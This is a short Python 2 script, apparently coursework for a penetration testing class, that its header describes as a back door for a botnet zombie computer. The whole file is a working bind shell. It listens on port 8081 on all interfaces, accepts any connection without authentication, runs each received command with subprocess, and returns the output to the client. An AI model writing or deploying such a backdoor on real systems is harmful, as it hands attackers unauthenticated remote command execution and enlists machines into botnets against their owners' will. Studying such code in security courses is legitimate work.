#!/usr/bin/python2

#Kyle Healy
#CPSC 62700 - Penetration Testing
#2/13/2019

# Python function to create a back door on a zombie computer for a bot net.

import socket, subprocess, select

# create the listener socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('',8081))


# start listening
listener.listen(10)

# create the list of all sockets
allsocks = [listener]

# the main service loop
while True:
    # use select to see if any sockets are ready
    ready, output, exceptions = select.select(allsocks,[], [])
    for sock in ready:
        # if its the listener, accept a new client connection
        if sock == listener:
            conn, addr = sock.accept()
            print "New connection from", addr
            allsocks.append(conn)
        # otherwise, its a command ot execute from a previously established client
        else:
            commstr = sock.recv(1024) #max size
            if commstr: #if it's not empty
                # split the string into the command and args
                commlist = commstr.rstrip().split(" ")
                print "Executing command: \n", commlist
                if commlist and commlist[0].lower()=='exit':
                    #special case for exit
                    sock.close()
                    allsocks.remove(sock)
                else:
                    # run the command with exception handling
                    try:
                        p1 = subprocess.Popen(commlist, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        out, err = p1.communicate()
                    except:
                        out = "Command failed\n"
                        sock.send(out)
                    else:
                        if err:
                            sock.send(err)
                        #command is finished, send output to client
                        sock.send(out)

#this code will actually never be reached.
listener.close()

